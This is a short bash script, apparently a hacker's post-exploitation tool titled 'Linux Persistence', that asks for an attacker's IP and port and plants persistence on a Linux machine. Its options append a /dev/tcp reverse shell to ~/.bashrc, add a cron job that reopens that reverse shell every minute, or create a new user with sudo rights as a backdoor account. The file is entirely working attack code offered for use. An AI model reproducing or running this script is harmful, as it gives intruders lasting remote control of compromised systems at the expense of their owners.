#!/bin/bash

echo '''
| |    |    ||    \ |  |  ||  |  |       |    \   /  _]|    \  / ___/|    | / ___/|      |  /  _]|    \    /  ]  /  _]
| |     |  | |  _  ||  |  ||  |  | _____ |  o  ) /  [_ |  D  )(   \_  |  | (   \_ |      | /  [_ |  _  |  /  /  /  [_ 
| |___  |  | |  |  ||  |  ||_   _||     ||   _/ |    _]|    /  \__  | |  |  \__  ||_|  |_||    _]|  |  | /  /  |    _]
|     | |  | |  |  ||  :  ||     ||_____||  |   |   [_ |    \  /  \ | |  |  /  \ |  |  |  |   [_ |  |  |/   \_ |   [_ 
|     | |  | |  |  ||     ||  |  |       |  |   |     ||  .  \ \    | |  |  \    |  |  |  |     ||  |  |\     ||     |
|_____||____||__|__| \__,_||__|__|       |__|   |_____||__|\_|  \___||____|  \___|  |__|  |_____||__|__| \____||_____|

'''
echo "Created by devilxuser also known as computer_boy on social media :)"

read -p "Enter your IP: " ip
read -p "Enter the port you want to listen on: " port

echo "Enter which persistence you want(1,2,3):"
echo "1) .bashrc Persistence"
echo "2) Privileged User (newuser)"
echo "3) Crontab Persistence"
read -p "Select an option: " per

if [ "$per" == "1" ]; then
    command="/bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
    echo "$command" >> ~/.bashrc
    echo ".bashrc Persistence added."

elif [ "$per" == "2" ]; then
    read -p "Enter the username for the new privileged user: " username
    sudo useradd -m "$username"
    sudo usermod -aG sudo "$username"
    echo "Privileged user '$username' created."

elif [ "$per" == "3" ]; then
    command="* * * * * /bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
    (crontab -l; echo "$command") | crontab -
    echo "Check it through entering 'crontab -l'"
    echo "Crontab Persistence added."

else
    echo "Invalid option selected."
fi

                                                     
